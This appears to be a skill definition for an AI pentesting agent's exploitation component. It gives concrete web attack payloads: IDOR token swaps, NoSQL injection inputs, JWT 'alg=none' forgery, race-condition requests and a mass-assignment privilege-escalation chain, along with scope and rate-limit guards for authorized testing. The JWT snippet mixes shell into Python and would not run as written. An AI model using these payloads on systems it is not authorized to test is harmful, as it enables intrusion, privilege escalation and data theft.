---
name: web-hypothesis-tester
description: Tests specific attack hypotheses with targeted techniques and proof collection - the "Exploiteur" component
metadata:
  keywords: exploit, test, hypothesis, validation, proof, targeted
---

# Web Hypothesis Tester (Exploiteur)

The **Exploiteur** component of hypothesis-driven testing. Executes **targeted** tests against specific hypotheses, collects proof, and returns structured results for graph enrichment.

## Philosophy: Surgical Testing, Not Shotgun Scanning

**Bad approach** (scanner mentality):
```
Run sqlmap on all parameters
Run XSStrike on all inputs  
Run nuclei with 5000 templates
```
→ Noisy, slow, low signal-to-noise ratio

**Good approach** (hypothesis-driven):
```
Hypothesis: "User role can access admin order IDs via /api/orders/{id}"

Test:
1. Login as user_A → create order → capture id_A
2. Login as admin → create order → capture id_admin
3. As user_A → GET /api/orders/{id_admin}
4. Expected: 403/404 | Actual: 200 with admin data
5. Confirmed: Vertical IDOR (F001)
```
→ Precise, fast, high-confidence result

## Input: Hypothesis Structure

Receives hypothesis from Stratège:

```json
{
  "id": "H042",
  "priority": 1,
  "type": "IDOR",
  "target": "/api/orders/{id}",
  "hypothesis": "User role can access admin orders via sequential ID enumeration",
  "rationale": [
    "IDs are sequential (observed 1234, 1235, 1236)",
    "No authorization check observed in user role tests",
    "Admin role returns different fields (internal_notes)"
  ],
  "prerequisites": ["user_account", "admin_account"],
  "test_approach": {
    "tool": "curl",
    "steps": [
      "Create order as admin, capture ID",
      "Request order as user with admin's ID",
      "Validate: 200 response = IDOR confirmed"
    ]
  },
  "success_criteria": "User receives 200 with admin-only fields",
  "impact_if_confirmed": "critical"
}
```

## Output: Structured Result

Returns test result with proof:

```json
{
  "hypothesis_id": "H042",
  "status": "confirmed",
  "finding_id": "F001",
  "severity": "critical",
  "title": "Vertical IDOR - User Access to Admin Orders",
  "evidence": {
    "request_1": {
      "method": "POST",
      "url": "https://target.com/api/orders",
      "auth": "admin JWT",
      "response_code": 201,
      "order_id": 5678
    },
    "request_2": {
      "method": "GET", 
      "url": "https://target.com/api/orders/5678",
      "auth": "user JWT",
      "response_code": 200,
      "response_body": {
        "id": 5678,
        "internal_notes": "Confidential admin data",
        "cost": 45.00
      }
    }
  },
  "proof": "User role received admin-only fields (internal_notes, cost) when accessing admin order ID",
  "graph_updates": {
    "endpoints": {
      "/api/orders/{id}": {
        "authorization": "broken - no role-based filtering",
        "idor_confirmed": true
      }
    },
    "findings": [{
      "id": "F001",
      "type": "CWE-639",
      "owasp": "A01:2021-Broken Access Control"
    }]
  },
  "new_hypotheses_triggered": [
    "If orders IDOR exists, test /api/users/{user_id} from order response",
    "Test write operations: PUT /api/orders/{admin_id} as user",
    "Test mass enumeration: iterate all IDs 1000-9999"
  ]
}
```

## Testing Techniques by Hypothesis Type

### 1. IDOR / Authorization Bypass

**Hypothesis**: "Role A can access role B's resources"

**Test approach**:
```bash
# Create resource as role B
curl -X POST https://target.com/api/orders \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d '{"item":"secret"}' \
  → returns {"id": 1234}

# Access as role A
curl https://target.com/api/orders/1234 \
  -H "Authorization: Bearer $USER_TOKEN"

# Expected: 403 Forbidden
# Actual: 200 OK with admin data → CONFIRMED
```

**Validation criteria**:
- ✅ Confirmed: 200 response with privileged data
- ⚠️ Partial: 200 but sanitized fields (still leak metadata)
- ❌ Blocked: 403/404 response
- 🤔 Unclear: 200 but unclear if data should be accessible

### 2. Parameter Injection (SQLi, NoSQLi, etc.)

**Hypothesis**: "Parameter X is vulnerable to NoSQL injection"

**Test approach** (benign first):
```bash
# Baseline
curl "https://target.com/api/search?username=admin"
→ returns admin user

# NoSQL boolean bypass (MongoDB)
curl "https://target.com/api/search?username[$ne]=null"
→ Expected: error/empty | Actual: returns all users → CONFIRMED

# Confirm with time-based check
curl "https://target.com/api/search?username[$where]=sleep(5000)"
→ 5 second delay → CONFIRMED
```

**Escalation levels**:
1. Boolean-based (true/false state change)
2. Error-based (different error messages)
3. Time-based (controlled delay)
4. ~~Data extraction~~ (only if scope authorizes exfiltration)

### 3. Authentication Bypass

**Hypothesis**: "JWT accepts 'none' algorithm"

**Test approach**:
```python
import jwt
import base64

# Capture valid token
valid_token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."

# Decode
header, payload, signature = valid_token.split('.')
decoded_header = json.loads(base64.urlsafe_b64decode(header + '=='))
decoded_payload = json.loads(base64.urlsafe_b64decode(payload + '=='))

# Forge token with alg=none
forged_header = {"alg": "none", "typ": "JWT"}
forged_token = base64.urlsafe_b64encode(json.dumps(forged_header)) + '.' + \
               base64.urlsafe_b64encode(json.dumps(decoded_payload)) + '.'

# Test
curl https://target.com/api/admin/users \
  -H "Authorization: Bearer $FORGED_TOKEN"

# Expected: 401 | Actual: 200 → CONFIRMED
```

### 4. Business Logic Chains

**Hypothesis**: "Race condition allows double-spend on credits"

**Test approach**:
```bash
# Setup: User has $100 balance, item costs $100
# Send 2 simultaneous purchase requests

curl -X POST https://target.com/api/purchase -d '{"item_id":123}' &
curl -X POST https://target.com/api/purchase -d '{"item_id":456}' &
wait

# Check balance
curl https://target.com/api/balance
→ Expected: $-100 or blocked | Actual: $0 (two items purchased) → CONFIRMED
```

Tools: `turbo-intruder`, `race-the-web`

### 5. Chained Exploits

**Hypothesis**: "IDOR + mass assignment = privilege escalation"

**Test chain**:
```bash
# Step 1: Confirm IDOR (from F001)
curl https://target.com/api/users/1 \
  -H "Authorization: Bearer $USER_TOKEN"
→ 200 OK (IDOR confirmed)

# Step 2: Test write access
curl -X PUT https://target.com/api/users/1 \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"name":"modified"}'
→ 200 OK (write access confirmed)

# Step 3: Test privilege escalation via mass assignment
curl -X PUT https://target.com/api/users/1 \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"is_admin":true}'
→ 200 OK

# Step 4: Verify escalation
curl https://target.com/api/admin/panel \
  -H "Authorization: Bearer $USER_TOKEN"
→ Expected: 403 | Actual: 200 → CHAIN CONFIRMED
```

Result: F001 (IDOR) + F007 (mass assignment) = Critical privilege escalation

## Critical: Test Then Update Graph

**After each test result**:

1. Update asset graph with finding
2. Trigger Stratège to regenerate hypotheses
3. Don't continue with stale hypothesis list

```python
# Test hypothesis H042
result = test_hypothesis(H042)

# Update graph immediately
if result.status == "confirmed":
    update_asset_graph(result.graph_updates)
    new_hypotheses = generate_hypotheses()  # Re-run Stratège
    
# Don't do this - stale list!
for h in old_hypothesis_list:  # ❌ List is outdated after first finding
    test_hypothesis(h)
```

## Proof Collection Standards

Every confirmed finding needs:

1. **Request/Response pairs** (sanitized)
2. **Step-by-step reproduction** 
3. **Expected vs Actual behavior**
4. **Impact statement** (what attacker gains)
5. **Scope compliance** (confirm test was authorized)

**Good proof**:
```markdown
## F001: Vertical IDOR on /api/orders/{id}

**Impact**: User role can access all admin orders, including cost data and internal notes

**Reproduction**:
1. As admin: POST /api/orders → creates order ID 5678
2. As user: GET /api/orders/5678 → 200 OK (expected: 403)
3. Response contains admin-only fields: internal_notes, cost

**Evidence**:
Request: GET /api/orders/5678
Authorization: Bearer eyJhbGc... (user token)
Response: 200 OK
{
  "id": 5678,
  "internal_notes": "Confidential data", // ← Admin-only field
  "cost": 45.00                          // ← Admin-only field
}

**Scope**: Authorized active testing per engagement scope
```

**Bad proof**:
```
Ran tool X, found IDOR
```

## Tools

Tools:
  - name: Test Hypothesis
    slug: test-hypothesis
    description: Execute targeted test for a specific hypothesis, collect proof, return structured result
    script: scripts/test_hypothesis.py
    network: true

  - name: Validate Finding
    slug: validate-finding
    description: Re-test a finding to confirm it's not a false positive, collect additional proof
    script: scripts/validate_finding.py
    network: true

  - name: Chain Exploit
    slug: chain-exploit
    description: Test a multi-step attack chain (e.g., IDOR → mass assignment → privilege escalation)
    script: scripts/chain_exploit.py
    network: true

## Authorization & Safety Guards

Before EVERY test:

1. **Check scope**: Is target endpoint in authorized scope?
2. **Check test type**: Is active testing authorized?
3. **Check payload**: Is destructive/OOB payload authorized?
4. **Rate limiting**: Respect engagement rate limits

```python
def test_hypothesis(hypothesis):
    # Guard 1: Scope check
    if not in_scope(hypothesis.target):
        return {"status": "blocked", "reason": "out of scope"}
    
    # Guard 2: Test type authorization
    if hypothesis.requires_destructive and not scope.allows_destructive:
        return {"status": "blocked", "reason": "destructive testing not authorized"}
    
    # Guard 3: Rate limiting
    if rate_limit_exceeded():
        return {"status": "deferred", "reason": "rate limit - retry in 60s"}
    
    # Proceed with test
    return execute_test(hypothesis)
```

## Integration with Loop

```
Stratège generates: H042 (priority 1 IDOR test)
   ↓
Exploiteur tests: H042
   ↓
Result: CONFIRMED → F001
   ↓
Mapper enriches graph with F001
   ↓
Stratège re-generates based on F001
   ↓
New hypothesis: H043 (chain F001 with mass assignment)
   ↓
Exploiteur tests: H043
   ↓
[LOOP CONTINUES]
```

## Stop Conditions

Stop testing when:
1. **Hypothesis blocked by scope** (requires out-of-scope test)
2. **Hypothesis requires unavailable prerequisite** (need 2nd tenant account, don't have it)
3. **Budget exhausted** (time/turns limit)
4. **All high/critical priority hypotheses tested**

Don't stop just because one test failed - update graph and regenerate!

## Output Format

```markdown
# Hypothesis Test Result - H042

**Status**: ✅ CONFIRMED

**Finding**: F001 - Vertical IDOR on /api/orders/{id}

**Severity**: Critical

**Proof**: [detailed evidence above]

**Graph Updates**:
- /api/orders/{id}: authorization=broken, idor_confirmed=true
- Finding F001 added to graph

**New Hypotheses Triggered**:
1. H043: Test write access via PUT /api/orders/{admin_id}
2. H044: Test object reference chain orders → users
3. H045: Test mass enumeration of all order IDs

**Recommended Next Test**: H043 (highest impact chain)
```

---

**Surgical strikes beat carpet bombing. One confirmed chain beats ten scanner leads.**
